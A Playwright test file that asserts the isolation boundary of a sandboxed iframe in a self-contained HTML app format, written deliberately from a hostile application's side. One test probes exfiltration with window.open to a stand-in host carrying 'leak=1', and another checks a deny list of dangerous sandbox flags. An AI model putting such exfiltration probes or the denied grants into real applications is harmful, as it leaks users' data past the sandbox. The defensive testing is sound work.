import { expect, test } from "@playwright/test";
import { dirname, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const container = pathToFileURL(
  resolve(dirname(fileURLToPath(import.meta.url)), "fixture/fixture.dai.html"),
).href;

/**
 * The isolation boundary, asserted rather than assumed.
 *
 * Containment is the format's central claim, and until these pass it is a
 * decorative one: `allow-same-origin` puts the application in the same origin
 * as the shell meant to contain it, where it can read the public key out of the
 * DOM, rewrite the bootloader, and forge anything the bridge reports. Integrity
 * is checked before mount so it cannot un-fail its own check — but saves are
 * self-perpetuating, so it can rewrite the bootloader that gets sealed into the
 * copy the next person opens.
 *
 * These tests are written from the attacker's side on purpose. Each one is a
 * thing a hostile application would try, and each must be impossible rather
 * than merely discouraged.
 */
test.describe("the application cannot reach its own shell", () => {
  test("the frame runs at an opaque origin", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    // A sandboxed frame without allow-same-origin reports "null": it belongs to
    // no origin, so nothing else can be same-origin with it either.
    const origin = await app.locator("body").evaluate(() => window.origin);
    expect(origin).toBe("null");
  });

  test("the frame cannot read the shell's document", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    const reach = await app.locator("body").evaluate(() => {
      try {
        // The public key and the integrity policy are meta tags in the shell.
        // Reading them is the first step in replacing them.
        const doc = (window.parent as unknown as { document?: Document }).document;
        return doc ? "readable" : "no document";
      } catch (error) {
        return "blocked: " + (error as Error).name;
      }
    });

    expect(reach).toMatch(/^blocked:/);
  });

  test("the frame cannot rewrite the bootloader that gets saved", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    const wrote = await app.locator("body").evaluate(() => {
      try {
        const parentWindow = window.parent as unknown as Record<string, unknown>;
        parentWindow.__DAI_TAMPER__ = true;
        return "wrote";
      } catch (error) {
        return "blocked: " + (error as Error).name;
      }
    });

    expect(wrote).toMatch(/^blocked:/);
    // And nothing landed, in case the write silently targeted the frame itself.
    expect(await page.evaluate(() => "__DAI_TAMPER__" in window)).toBe(false);
  });

  test("the application cannot open a window", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    // window.open is an exfiltration channel no CSP directive governs: the URL
    // carries the data. Asserted behaviourally rather than by reading the
    // sandbox attribute, because the attribute is a claim and this is the
    // effect.
    const opened = await app.locator("body").evaluate(() => {
      try {
        const win = window.open("https://example.invalid/?leak=1", "_blank");
        if (win) {
          win.close();
          return "opened";
        }
        return "refused";
      } catch (error) {
        return "threw: " + (error as Error).name;
      }
    });

    expect(opened).not.toBe("opened");
  });

  test("web storage is present but keeps nothing", async ({ page }) => {
    await page.goto(container);
    const app = page.frameLocator("iframe");
    await app.locator("body").waitFor({ timeout: 20_000 });

    // Deliberate, and worth pinning. At an opaque origin localStorage throws
    // rather than returning null, and sqlite3ApiBootstrap reads it — so the
    // engine could not start without a stand-in. An in-memory one also matches
    // what the format promises: data belongs in the file, and anything written
    // to browser storage would stay on the machine that wrote it.
    const behaviour = await app.locator("body").evaluate(() => {
      try {
        localStorage.setItem("dai-probe", "kept");
        return {
          writes: localStorage.getItem("dai-probe"),
          isRealStorage: localStorage instanceof Storage,
        };
      } catch (error) {
        return { writes: "threw: " + (error as Error).name, isRealStorage: false };
      }
    });

    expect(behaviour.writes).toBe("kept");
    expect(behaviour.isRealStorage).toBe(false);
  });

  test("the shell grants no capability the application could abuse", async ({ page }) => {
    await page.goto(container);

    const flags = await page.locator("iframe").getAttribute("sandbox");
    const granted = (flags ?? "").split(/\s+/).filter(Boolean);

    // allow-popups is an exfiltration channel no CSP directive governs:
    // window.open carries a URL, and a URL carries data.
    expect(granted).not.toContain("allow-popups");
    expect(granted).not.toContain("allow-same-origin");
    expect(granted).not.toContain("allow-top-navigation");
    expect(granted).not.toContain("allow-top-navigation-by-user-activation");

    // What remains has to be enough to run an application and nothing more.
    expect(granted).toContain("allow-scripts");
  });
});
